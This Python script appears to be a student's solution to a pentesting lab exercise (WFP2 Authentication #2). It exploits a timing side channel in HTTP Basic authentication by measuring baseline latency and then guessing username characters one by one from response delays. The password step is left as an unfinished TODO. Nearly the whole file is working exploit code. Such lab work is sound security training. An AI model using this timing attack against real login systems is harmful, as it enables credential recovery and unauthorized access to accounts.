#! /usr/bin/env python

#Program #2 (​WFP2: Authentication #2)
#● The authentication routine leaks timing information that allows
#  adversary to guess characters of both the username and
#  password
#● Write a Python program that uses the vulnerability to
#  automatically determine the username and password
#● Note that both are alpha-numeric

import sys
import requests
import time
from requests.auth import HTTPBasicAuth

# TODO make python3
#WWW-Authenticate: Basic realm="Username is hacker, now you need to find the password"
#TODO need to programatically get both.

# check if arguments are present
if len(sys.argv) < 2:
  print("Usage: {} http://example.com".format(sys.argv[0]))
  sys.exit(1)
else:
  host = sys.argv[1]
  print("Using hostname: {}".format(host))

#http://104.199.122.160/authentication/example2/

baseurl = "/authentication/example2/"
username = ''
password = ''
url = host + baseurl
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
success = False

# need to know username before this or this wont work....this sucks
# run a loop 10 times to get network overhead with passwords that are not alpha-numeric
# this way we can adjust our timeing based on network latency, etc
total_time = 0.0
runs = 10
for i in range(0,runs):
    # guaranteed not to work since these are not alpha-numeric
    user = "#"
    password = "#"
    before = time.time()
    r = requests.get(url, auth=HTTPBasicAuth(user, password))
    after = time.time()
    total_time += (after - before)

average_time = float(total_time / runs)
print("Average time with guaranteed incorrect combinations: {}".format(average_time))

done_username = False
while not done_username:
    # get next character from the password
    for char in chars:
        guessed_username = username + char
        # just guessing username, no need for correct password
        # we can ignore password by making it an invalid non-alphanumeric char
        guessed_password = ""
        # get time before doing requests
        before = time.time()
        r = requests.get(url, auth=HTTPBasicAuth(guessed_username, guessed_password))
        after = time.time()
        total_time = after - before
        print("Tried: {0} with time {1}".format(guessed_username, total_time))
        # dont overwhelm server.... :(
        time.sleep(0.3)
        if(total_time >= average_time + (0.18*len(guessed_username))):
            print("correctly guessed username: {0}".format(guessed_username))
            username += char
            break
